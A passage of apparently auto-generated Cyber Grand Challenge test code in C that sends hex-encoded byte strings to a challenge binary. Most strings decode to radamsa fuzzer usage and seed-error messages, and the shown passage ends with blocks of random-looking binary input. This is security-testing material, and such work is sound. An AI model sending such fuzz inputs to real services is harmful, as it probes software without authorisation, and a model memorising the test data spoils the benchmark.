   } while (0);
   do {
      //*** writing data
      static unsigned char write_00041_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00041_00000_len = 16;
      unsigned char *write_00041 = NULL;
      unsigned int write_00041_len = 0;
      write_00041 = cgc_append_buf(write_00041, &write_00041_len, write_00041_00000, write_00041_00000_len);
      if (write_00041_len > 0) {
         cgc_transmit_all(1, write_00041, write_00041_len);
      }
      cgc_free(write_00041);
   } while (0);
   do {
      unsigned char *read_00042;
      unsigned int read_00042_len;
      unsigned int read_00042_ptr = 0;
      //**** length read
      read_00042_len = 25;
      read_00042 = (unsigned char*)cgc_malloc(read_00042_len);
      int read_00042_res = cgc_length_read(0, read_00042, read_00042_len);
      if (read_00042_res) {} //silence unused variable warning
      cgc_free(read_00042);
      if (read_00042_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00042_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00042_00000_len = 16;
      unsigned char *write_00042 = NULL;
      unsigned int write_00042_len = 0;
      write_00042 = cgc_append_buf(write_00042, &write_00042_len, write_00042_00000, write_00042_00000_len);
      if (write_00042_len > 0) {
         cgc_transmit_all(1, write_00042, write_00042_len);
      }
      cgc_free(write_00042);
   } while (0);
   do {
      unsigned char *read_00043;
      unsigned int read_00043_len;
      unsigned int read_00043_ptr = 0;
      //**** length read
      read_00043_len = 25;
      read_00043 = (unsigned char*)cgc_malloc(read_00043_len);
      int read_00043_res = cgc_length_read(0, read_00043, read_00043_len);
      if (read_00043_res) {} //silence unused variable warning
      cgc_free(read_00043);
      if (read_00043_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00043_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00043_00000_len = 6;
      unsigned char *write_00043 = NULL;
      unsigned int write_00043_len = 0;
      write_00043 = cgc_append_buf(write_00043, &write_00043_len, write_00043_00000, write_00043_00000_len);
      if (write_00043_len > 0) {
         cgc_transmit_all(1, write_00043, write_00043_len);
      }
      cgc_free(write_00043);
   } while (0);
   do {
      unsigned char *read_00044;
      unsigned int read_00044_len;
      unsigned int read_00044_ptr = 0;
      //**** length read
      read_00044_len = 25;
      read_00044 = (unsigned char*)cgc_malloc(read_00044_len);
      int read_00044_res = cgc_length_read(0, read_00044, read_00044_len);
      if (read_00044_res) {} //silence unused variable warning
      cgc_free(read_00044);
      if (read_00044_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00044_00000[] = 
         "\x33\x34\x30\x32\x38\x32\x33\x36\x36\x39\x32\x30\x39\x33\x38\x34";
      static unsigned int write_00044_00000_len = 16;
      unsigned char *write_00044 = NULL;
      unsigned int write_00044_len = 0;
      write_00044 = cgc_append_buf(write_00044, &write_00044_len, write_00044_00000, write_00044_00000_len);
      if (write_00044_len > 0) {
         cgc_transmit_all(1, write_00044, write_00044_len);
      }
      cgc_free(write_00044);
   } while (0);
   do {
      unsigned char *read_00045;
      unsigned int read_00045_len;
      unsigned int read_00045_ptr = 0;
      //**** length read
      read_00045_len = 25;
      read_00045 = (unsigned char*)cgc_malloc(read_00045_len);
      int read_00045_res = cgc_length_read(0, read_00045, read_00045_len);
      if (read_00045_res) {} //silence unused variable warning
      cgc_free(read_00045);
      if (read_00045_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00045_00000[] = 
         "\x36\x33\x34\x36\x33\x33\x37\x34\x36\x30\x37\x34\x33\x31\x37\x36";
      static unsigned int write_00045_00000_len = 16;
      unsigned char *write_00045 = NULL;
      unsigned int write_00045_len = 0;
      write_00045 = cgc_append_buf(write_00045, &write_00045_len, write_00045_00000, write_00045_00000_len);
      if (write_00045_len > 0) {
         cgc_transmit_all(1, write_00045, write_00045_len);
      }
      cgc_free(write_00045);
   } while (0);
   do {
      unsigned char *read_00046;
      unsigned int read_00046_len;
      unsigned int read_00046_ptr = 0;
      //**** length read
      read_00046_len = 25;
      read_00046 = (unsigned char*)cgc_malloc(read_00046_len);
      int read_00046_res = cgc_length_read(0, read_00046, read_00046_len);
      if (read_00046_res) {} //silence unused variable warning
      cgc_free(read_00046);
      if (read_00046_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00046_00000[] = 
         "\x38\x32\x31\x31\x33\x39\x36\x0a";
      static unsigned int write_00046_00000_len = 8;
      unsigned char *write_00046 = NULL;
      unsigned int write_00046_len = 0;
      write_00046 = cgc_append_buf(write_00046, &write_00046_len, write_00046_00000, write_00046_00000_len);
      if (write_00046_len > 0) {
         cgc_transmit_all(1, write_00046, write_00046_len);
      }
      cgc_free(write_00046);
   } while (0);
   do {
      unsigned char *read_00047;
      unsigned int read_00047_len;
      unsigned int read_00047_ptr = 0;
      //**** length read
      read_00047_len = 25;
      read_00047 = (unsigned char*)cgc_malloc(read_00047_len);
      int read_00047_res = cgc_length_read(0, read_00047, read_00047_len);
      if (read_00047_res) {} //silence unused variable warning
      cgc_free(read_00047);
      if (read_00047_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00047_00000[] = 
         "\x30\x0a";
      static unsigned int write_00047_00000_len = 2;
      unsigned char *write_00047 = NULL;
      unsigned int write_00047_len = 0;
      write_00047 = cgc_append_buf(write_00047, &write_00047_len, write_00047_00000, write_00047_00000_len);
      if (write_00047_len > 0) {
         cgc_transmit_all(1, write_00047, write_00047_len);
      }
      cgc_free(write_00047);
   } while (0);
   do {
      unsigned char *read_00048;
      unsigned int read_00048_len;
      unsigned int read_00048_ptr = 0;
      //**** length read
      read_00048_len = 25;
      read_00048 = (unsigned char*)cgc_malloc(read_00048_len);
      int read_00048_res = cgc_length_read(0, read_00048, read_00048_len);
      if (read_00048_res) {} //silence unused variable warning
      cgc_free(read_00048);
      if (read_00048_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00048_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00048_00000_len = 16;
      unsigned char *write_00048 = NULL;
      unsigned int write_00048_len = 0;
      write_00048 = cgc_append_buf(write_00048, &write_00048_len, write_00048_00000, write_00048_00000_len);
      if (write_00048_len > 0) {
         cgc_transmit_all(1, write_00048, write_00048_len);
      }
      cgc_free(write_00048);
   } while (0);
   do {
      unsigned char *read_00049;
      unsigned int read_00049_len;
      unsigned int read_00049_ptr = 0;
      //**** length read
      read_00049_len = 25;
      read_00049 = (unsigned char*)cgc_malloc(read_00049_len);
      int read_00049_res = cgc_length_read(0, read_00049, read_00049_len);
      if (read_00049_res) {} //silence unused variable warning
      cgc_free(read_00049);
      if (read_00049_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00049_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00049_00000_len = 16;
      unsigned char *write_00049 = NULL;
      unsigned int write_00049_len = 0;
      write_00049 = cgc_append_buf(write_00049, &write_00049_len, write_00049_00000, write_00049_00000_len);
      if (write_00049_len > 0) {
         cgc_transmit_all(1, write_00049, write_00049_len);
      }
      cgc_free(write_00049);
   } while (0);
   do {
      unsigned char *read_00050;
      unsigned int read_00050_len;
      unsigned int read_00050_ptr = 0;
      //**** length read
      read_00050_len = 25;
      read_00050 = (unsigned char*)cgc_malloc(read_00050_len);
      int read_00050_res = cgc_length_read(0, read_00050, read_00050_len);
      if (read_00050_res) {} //silence unused variable warning
      cgc_free(read_00050);
      if (read_00050_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00050_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x37\x35\x35\x39\x35\x33\x37\x30\x31";
      static unsigned int write_00050_00000_len = 16;
      unsigned char *write_00050 = NULL;
      unsigned int write_00050_len = 0;
      write_00050 = cgc_append_buf(write_00050, &write_00050_len, write_00050_00000, write_00050_00000_len);
      if (write_00050_len > 0) {
         cgc_transmit_all(1, write_00050, write_00050_len);
      }
      cgc_free(write_00050);
   } while (0);
   do {
      unsigned char *read_00051;
      unsigned int read_00051_len;
      unsigned int read_00051_ptr = 0;
      //**** length read
      read_00051_len = 25;
      read_00051 = (unsigned char*)cgc_malloc(read_00051_len);
      int read_00051_res = cgc_length_read(0, read_00051, read_00051_len);
      if (read_00051_res) {} //silence unused variable warning
      cgc_free(read_00051);
      if (read_00051_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00051_00000[] = 
         "\x38\x37\x39\x36\x38\x32\x32\x37\x39\x32\x27\x2e\x0a";
      static unsigned int write_00051_00000_len = 13;
      unsigned char *write_00051 = NULL;
      unsigned int write_00051_len = 0;
      write_00051 = cgc_append_buf(write_00051, &write_00051_len, write_00051_00000, write_00051_00000_len);
      if (write_00051_len > 0) {
         cgc_transmit_all(1, write_00051, write_00051_len);
      }
      cgc_free(write_00051);
   } while (0);
   do {
      unsigned char *read_00052;
      unsigned int read_00052_len;
      unsigned int read_00052_ptr = 0;
      //**** length read
      read_00052_len = 25;
      read_00052 = (unsigned char*)cgc_malloc(read_00052_len);
      int read_00052_res = cgc_length_read(0, read_00052, read_00052_len);
      if (read_00052_res) {} //silence unused variable warning
      cgc_free(read_00052);
      if (read_00052_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00052_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00052_00000_len = 16;
      unsigned char *write_00052 = NULL;
      unsigned int write_00052_len = 0;
      write_00052 = cgc_append_buf(write_00052, &write_00052_len, write_00052_00000, write_00052_00000_len);
      if (write_00052_len > 0) {
         cgc_transmit_all(1, write_00052, write_00052_len);
      }
      cgc_free(write_00052);
   } while (0);
   do {
      unsigned char *read_00053;
      unsigned int read_00053_len;
      unsigned int read_00053_ptr = 0;
      //**** length read
      read_00053_len = 25;
      read_00053 = (unsigned char*)cgc_malloc(read_00053_len);
      int read_00053_res = cgc_length_read(0, read_00053, read_00053_len);
      if (read_00053_res) {} //silence unused variable warning
      cgc_free(read_00053);
      if (read_00053_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00053_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00053_00000_len = 16;
      unsigned char *write_00053 = NULL;
      unsigned int write_00053_len = 0;
      write_00053 = cgc_append_buf(write_00053, &write_00053_len, write_00053_00000, write_00053_00000_len);
      if (write_00053_len > 0) {
         cgc_transmit_all(1, write_00053, write_00053_len);
      }
      cgc_free(write_00053);
   } while (0);
   do {
      unsigned char *read_00054;
      unsigned int read_00054_len;
      unsigned int read_00054_ptr = 0;
      //**** length read
      read_00054_len = 25;
      read_00054 = (unsigned char*)cgc_malloc(read_00054_len);
      int read_00054_res = cgc_length_read(0, read_00054, read_00054_len);
      if (read_00054_res) {} //silence unused variable warning
      cgc_free(read_00054);
      if (read_00054_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00054_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00054_00000_len = 6;
      unsigned char *write_00054 = NULL;
      unsigned int write_00054_len = 0;
      write_00054 = cgc_append_buf(write_00054, &write_00054_len, write_00054_00000, write_00054_00000_len);
      if (write_00054_len > 0) {
         cgc_transmit_all(1, write_00054, write_00054_len);
      }
      cgc_free(write_00054);
   } while (0);
   do {
      unsigned char *read_00055;
      unsigned int read_00055_len;
      unsigned int read_00055_ptr = 0;
      //**** length read
      read_00055_len = 25;
      read_00055 = (unsigned char*)cgc_malloc(read_00055_len);
      int read_00055_res = cgc_length_read(0, read_00055, read_00055_len);
      if (read_00055_res) {} //silence unused variable warning
      cgc_free(read_00055);
      if (read_00055_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00055_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00055_00000_len = 16;
      unsigned char *write_00055 = NULL;
      unsigned int write_00055_len = 0;
      write_00055 = cgc_append_buf(write_00055, &write_00055_len, write_00055_00000, write_00055_00000_len);
      if (write_00055_len > 0) {
         cgc_transmit_all(1, write_00055, write_00055_len);
      }
      cgc_free(write_00055);
   } while (0);
   do {
      unsigned char *read_00056;
      unsigned int read_00056_len;
      unsigned int read_00056_ptr = 0;
      //**** length read
      read_00056_len = 25;
      read_00056 = (unsigned char*)cgc_malloc(read_00056_len);
      int read_00056_res = cgc_length_read(0, read_00056, read_00056_len);
      if (read_00056_res) {} //silence unused variable warning
      cgc_free(read_00056);
      if (read_00056_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00056_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00056_00000_len = 16;
      unsigned char *write_00056 = NULL;
      unsigned int write_00056_len = 0;
      write_00056 = cgc_append_buf(write_00056, &write_00056_len, write_00056_00000, write_00056_00000_len);
      if (write_00056_len > 0) {
         cgc_transmit_all(1, write_00056, write_00056_len);
      }
      cgc_free(write_00056);
   } while (0);
   do {
      unsigned char *read_00057;
      unsigned int read_00057_len;
      unsigned int read_00057_ptr = 0;
      //**** length read
      read_00057_len = 25;
      read_00057 = (unsigned char*)cgc_malloc(read_00057_len);
      int read_00057_res = cgc_length_read(0, read_00057, read_00057_len);
      if (read_00057_res) {} //silence unused variable warning
      cgc_free(read_00057);
      if (read_00057_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00057_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x34\x36\x37\x38\x39\x30\x37\x34\x31";
      static unsigned int write_00057_00000_len = 16;
      unsigned char *write_00057 = NULL;
      unsigned int write_00057_len = 0;
      write_00057 = cgc_append_buf(write_00057, &write_00057_len, write_00057_00000, write_00057_00000_len);
      if (write_00057_len > 0) {
         cgc_transmit_all(1, write_00057, write_00057_len);
      }
      cgc_free(write_00057);
   } while (0);
   do {
      unsigned char *read_00058;
      unsigned int read_00058_len;
      unsigned int read_00058_ptr = 0;
      //**** length read
      read_00058_len = 25;
      read_00058 = (unsigned char*)cgc_malloc(read_00058_len);
      int read_00058_res = cgc_length_read(0, read_00058, read_00058_len);
      if (read_00058_res) {} //silence unused variable warning
      cgc_free(read_00058);
      if (read_00058_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00058_00000[] = 
         "\x38\x33\x33\x35\x36\x36\x34\x31\x38\x32\x27\x2e\x0a";
      static unsigned int write_00058_00000_len = 13;
      unsigned char *write_00058 = NULL;
      unsigned int write_00058_len = 0;
      write_00058 = cgc_append_buf(write_00058, &write_00058_len, write_00058_00000, write_00058_00000_len);
      if (write_00058_len > 0) {
         cgc_transmit_all(1, write_00058, write_00058_len);
      }
      cgc_free(write_00058);
   } while (0);
   do {
      unsigned char *read_00059;
      unsigned int read_00059_len;
      unsigned int read_00059_ptr = 0;
      //**** length read
      read_00059_len = 25;
      read_00059 = (unsigned char*)cgc_malloc(read_00059_len);
      int read_00059_res = cgc_length_read(0, read_00059, read_00059_len);
      if (read_00059_res) {} //silence unused variable warning
      cgc_free(read_00059);
      if (read_00059_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00059_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00059_00000_len = 16;
      unsigned char *write_00059 = NULL;
      unsigned int write_00059_len = 0;
      write_00059 = cgc_append_buf(write_00059, &write_00059_len, write_00059_00000, write_00059_00000_len);
      if (write_00059_len > 0) {
         cgc_transmit_all(1, write_00059, write_00059_len);
      }
      cgc_free(write_00059);
   } while (0);
   do {
      unsigned char *read_00060;
      unsigned int read_00060_len;
      unsigned int read_00060_ptr = 0;
      //**** length read
      read_00060_len = 25;
      read_00060 = (unsigned char*)cgc_malloc(read_00060_len);
      int read_00060_res = cgc_length_read(0, read_00060, read_00060_len);
      if (read_00060_res) {} //silence unused variable warning
      cgc_free(read_00060);
      if (read_00060_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00060_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00060_00000_len = 16;
      unsigned char *write_00060 = NULL;
      unsigned int write_00060_len = 0;
      write_00060 = cgc_append_buf(write_00060, &write_00060_len, write_00060_00000, write_00060_00000_len);
      if (write_00060_len > 0) {
         cgc_transmit_all(1, write_00060, write_00060_len);
      }
      cgc_free(write_00060);
   } while (0);
   do {
      unsigned char *read_00061;
      unsigned int read_00061_len;
      unsigned int read_00061_ptr = 0;
      //**** length read
      read_00061_len = 25;
      read_00061 = (unsigned char*)cgc_malloc(read_00061_len);
      int read_00061_res = cgc_length_read(0, read_00061, read_00061_len);
      if (read_00061_res) {} //silence unused variable warning
      cgc_free(read_00061);
      if (read_00061_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00061_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00061_00000_len = 6;
      unsigned char *write_00061 = NULL;
      unsigned int write_00061_len = 0;
      write_00061 = cgc_append_buf(write_00061, &write_00061_len, write_00061_00000, write_00061_00000_len);
      if (write_00061_len > 0) {
         cgc_transmit_all(1, write_00061, write_00061_len);
      }
      cgc_free(write_00061);
   } while (0);
   do {
      unsigned char *read_00062;
      unsigned int read_00062_len;
      unsigned int read_00062_ptr = 0;
      //**** length read
      read_00062_len = 25;
      read_00062 = (unsigned char*)cgc_malloc(read_00062_len);
      int read_00062_res = cgc_length_read(0, read_00062, read_00062_len);
      if (read_00062_res) {} //silence unused variable warning
      cgc_free(read_00062);
      if (read_00062_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00062_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00062_00000_len = 16;
      unsigned char *write_00062 = NULL;
      unsigned int write_00062_len = 0;
      write_00062 = cgc_append_buf(write_00062, &write_00062_len, write_00062_00000, write_00062_00000_len);
      if (write_00062_len > 0) {
         cgc_transmit_all(1, write_00062, write_00062_len);
      }
      cgc_free(write_00062);
   } while (0);
   do {
      unsigned char *read_00063;
      unsigned int read_00063_len;
      unsigned int read_00063_ptr = 0;
      //**** length read
      read_00063_len = 25;
      read_00063 = (unsigned char*)cgc_malloc(read_00063_len);
      int read_00063_res = cgc_length_read(0, read_00063, read_00063_len);
      if (read_00063_res) {} //silence unused variable warning
      cgc_free(read_00063);
      if (read_00063_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00063_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00063_00000_len = 16;
      unsigned char *write_00063 = NULL;
      unsigned int write_00063_len = 0;
      write_00063 = cgc_append_buf(write_00063, &write_00063_len, write_00063_00000, write_00063_00000_len);
      if (write_00063_len > 0) {
         cgc_transmit_all(1, write_00063, write_00063_len);
      }
      cgc_free(write_00063);
   } while (0);
   do {
      unsigned char *read_00064;
      unsigned int read_00064_len;
      unsigned int read_00064_ptr = 0;
      //**** length read
      read_00064_len = 25;
      read_00064 = (unsigned char*)cgc_malloc(read_00064_len);
      int read_00064_res = cgc_length_read(0, read_00064, read_00064_len);
      if (read_00064_res) {} //silence unused variable warning
      cgc_free(read_00064);
      if (read_00064_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00064_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x34\x30\x34\x30\x35\x33\x35\x35\x38";
      static unsigned int write_00064_00000_len = 16;
      unsigned char *write_00064 = NULL;
      unsigned int write_00064_len = 0;
      write_00064 = cgc_append_buf(write_00064, &write_00064_len, write_00064_00000, write_00064_00000_len);
      if (write_00064_len > 0) {
         cgc_transmit_all(1, write_00064, write_00064_len);
      }
      cgc_free(write_00064);
   } while (0);
   do {
      unsigned char *read_00065;
      unsigned int read_00065_len;
      unsigned int read_00065_ptr = 0;
      //**** length read
      read_00065_len = 25;
      read_00065 = (unsigned char*)cgc_malloc(read_00065_len);
      int read_00065_res = cgc_length_read(0, read_00065, read_00065_len);
      if (read_00065_res) {} //silence unused variable warning
      cgc_free(read_00065);
      if (read_00065_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00065_00000[] = 
         "\x37\x37\x33\x30\x32\x31\x39\x39\x35\x36\x27\x2e\x0a";
      static unsigned int write_00065_00000_len = 13;
      unsigned char *write_00065 = NULL;
      unsigned int write_00065_len = 0;
      write_00065 = cgc_append_buf(write_00065, &write_00065_len, write_00065_00000, write_00065_00000_len);
      if (write_00065_len > 0) {
         cgc_transmit_all(1, write_00065, write_00065_len);
      }
      cgc_free(write_00065);
   } while (0);
   do {
      unsigned char *read_00066;
      unsigned int read_00066_len;
      unsigned int read_00066_ptr = 0;
      //**** length read
      read_00066_len = 25;
      read_00066 = (unsigned char*)cgc_malloc(read_00066_len);
      int read_00066_res = cgc_length_read(0, read_00066, read_00066_len);
      if (read_00066_res) {} //silence unused variable warning
      cgc_free(read_00066);
      if (read_00066_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00066_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00066_00000_len = 16;
      unsigned char *write_00066 = NULL;
      unsigned int write_00066_len = 0;
      write_00066 = cgc_append_buf(write_00066, &write_00066_len, write_00066_00000, write_00066_00000_len);
      if (write_00066_len > 0) {
         cgc_transmit_all(1, write_00066, write_00066_len);
      }
      cgc_free(write_00066);
   } while (0);
   do {
      unsigned char *read_00067;
      unsigned int read_00067_len;
      unsigned int read_00067_ptr = 0;
      //**** length read
      read_00067_len = 25;
      read_00067 = (unsigned char*)cgc_malloc(read_00067_len);
      int read_00067_res = cgc_length_read(0, read_00067, read_00067_len);
      if (read_00067_res) {} //silence unused variable warning
      cgc_free(read_00067);
      if (read_00067_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00067_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00067_00000_len = 16;
      unsigned char *write_00067 = NULL;
      unsigned int write_00067_len = 0;
      write_00067 = cgc_append_buf(write_00067, &write_00067_len, write_00067_00000, write_00067_00000_len);
      if (write_00067_len > 0) {
         cgc_transmit_all(1, write_00067, write_00067_len);
      }
      cgc_free(write_00067);
   } while (0);
   do {
      unsigned char *read_00068;
      unsigned int read_00068_len;
      unsigned int read_00068_ptr = 0;
      //**** length read
      read_00068_len = 25;
      read_00068 = (unsigned char*)cgc_malloc(read_00068_len);
      int read_00068_res = cgc_length_read(0, read_00068, read_00068_len);
      if (read_00068_res) {} //silence unused variable warning
      cgc_free(read_00068);
      if (read_00068_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00068_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00068_00000_len = 6;
      unsigned char *write_00068 = NULL;
      unsigned int write_00068_len = 0;
      write_00068 = cgc_append_buf(write_00068, &write_00068_len, write_00068_00000, write_00068_00000_len);
      if (write_00068_len > 0) {
         cgc_transmit_all(1, write_00068, write_00068_len);
      }
      cgc_free(write_00068);
   } while (0);
   do {
      unsigned char *read_00069;
      unsigned int read_00069_len;
      unsigned int read_00069_ptr = 0;
      //**** length read
      read_00069_len = 25;
      read_00069 = (unsigned char*)cgc_malloc(read_00069_len);
      int read_00069_res = cgc_length_read(0, read_00069, read_00069_len);
      if (read_00069_res) {} //silence unused variable warning
      cgc_free(read_00069);
      if (read_00069_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00069_00000[] = 
         "\x32\x0a";
      static unsigned int write_00069_00000_len = 2;
      unsigned char *write_00069 = NULL;
      unsigned int write_00069_len = 0;
      write_00069 = cgc_append_buf(write_00069, &write_00069_len, write_00069_00000, write_00069_00000_len);
      if (write_00069_len > 0) {
         cgc_transmit_all(1, write_00069, write_00069_len);
      }
      cgc_free(write_00069);
   } while (0);
   do {
      unsigned char *read_00070;
      unsigned int read_00070_len;
      unsigned int read_00070_ptr = 0;
      //**** length read
      read_00070_len = 7;
      read_00070 = (unsigned char*)cgc_malloc(read_00070_len);
      int read_00070_res = cgc_length_read(0, read_00070, read_00070_len);
      if (read_00070_res) {} //silence unused variable warning
      cgc_free(read_00070);
      if (read_00070_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00070_00000[] = 
         "\xdc\x96\x25\xfb\x3b\xb6\x3d\xe5\xf0\xaf\x8b\xd3\x04\xec\xf9\xb4";
      static unsigned int write_00070_00000_len = 16;
      unsigned char *write_00070 = NULL;
      unsigned int write_00070_len = 0;
      write_00070 = cgc_append_buf(write_00070, &write_00070_len, write_00070_00000, write_00070_00000_len);
      if (write_00070_len > 0) {
         cgc_transmit_all(1, write_00070, write_00070_len);
      }
      cgc_free(write_00070);
   } while (0);
   do {
      unsigned char *read_00071;
      unsigned int read_00071_len;
      unsigned int read_00071_ptr = 0;
      //**** length read
      read_00071_len = 25;
      read_00071 = (unsigned char*)cgc_malloc(read_00071_len);
      int read_00071_res = cgc_length_read(0, read_00071, read_00071_len);
      if (read_00071_res) {} //silence unused variable warning
      cgc_free(read_00071);
      if (read_00071_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00071_00000[] = 
         "\xff\xb3\x72\x4a\xfe\xb4\x5c\xe5\x24\xd9\x45\x36\xd2\xda\xa7\x47";
      static unsigned int write_00071_00000_len = 16;
      unsigned char *write_00071 = NULL;
      unsigned int write_00071_len = 0;
      write_00071 = cgc_append_buf(write_00071, &write_00071_len, write_00071_00000, write_00071_00000_len);
      if (write_00071_len > 0) {
         cgc_transmit_all(1, write_00071, write_00071_len);
      }
      cgc_free(write_00071);
   } while (0);
   do {
      unsigned char *read_00072;
      unsigned int read_00072_len;
      unsigned int read_00072_ptr = 0;
      //**** length read
      read_00072_len = 25;
      read_00072 = (unsigned char*)cgc_malloc(read_00072_len);
      int read_00072_res = cgc_length_read(0, read_00072, read_00072_len);
      if (read_00072_res) {} //silence unused variable warning
      cgc_free(read_00072);
      if (read_00072_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00072_00000[] = 
         "\xbc\xbc\x45\x8d\xd5\x98\xac\x11\x60\xb1\x7f\x54\xe3\x9e\x7f\x97";
      static unsigned int write_00072_00000_len = 16;
      unsigned char *write_00072 = NULL;
      unsigned int write_00072_len = 0;
      write_00072 = cgc_append_buf(write_00072, &write_00072_len, write_00072_00000, write_00072_00000_len);
      if (write_00072_len > 0) {
         cgc_transmit_all(1, write_00072, write_00072_len);
      }
      cgc_free(write_00072);
   } while (0);
   do {
      unsigned char *read_00073;
      unsigned int read_00073_len;
      unsigned int read_00073_ptr = 0;
      //**** length read
      read_00073_len = 25;
      read_00073 = (unsigned char*)cgc_malloc(read_00073_len);
      int read_00073_res = cgc_length_read(0, read_00073, read_00073_len);
      if (read_00073_res) {} //silence unused variable warning
      cgc_free(read_00073);
      if (read_00073_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00073_00000[] = 
         "\x35\x13\xa7\x3e\x9f\x9e\x28\x58\x03\xb9\x77\x50\x23\x67\xbb\x19";
      static unsigned int write_00073_00000_len = 16;
      unsigned char *write_00073 = NULL;
      unsigned int write_00073_len = 0;
      write_00073 = cgc_append_buf(write_00073, &write_00073_len, write_00073_00000, write_00073_00000_len);
      if (write_00073_len > 0) {
         cgc_transmit_all(1, write_00073, write_00073_len);
      }
      cgc_free(write_00073);
   } while (0);
   do {
      unsigned char *read_00074;
      unsigned int read_00074_len;
      unsigned int read_00074_ptr = 0;
      //**** length read
      read_00074_len = 25;
      read_00074 = (unsigned char*)cgc_malloc(read_00074_len);
      int read_00074_res = cgc_length_read(0, read_00074, read_00074_len);
      if (read_00074_res) {} //silence unused variable warning
      cgc_free(read_00074);
      if (read_00074_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00074_00000[] = 
         "\x12\x76\x6b\xfb\xf3\x11\xc2\x7f\x0e\x75\x49\x78\xea\x02\x42\x38";
      static unsigned int write_00074_00000_len = 16;
      unsigned char *write_00074 = NULL;
      unsigned int write_00074_len = 0;
      write_00074 = cgc_append_buf(write_00074, &write_00074_len, write_00074_00000, write_00074_00000_len);
      if (write_00074_len > 0) {
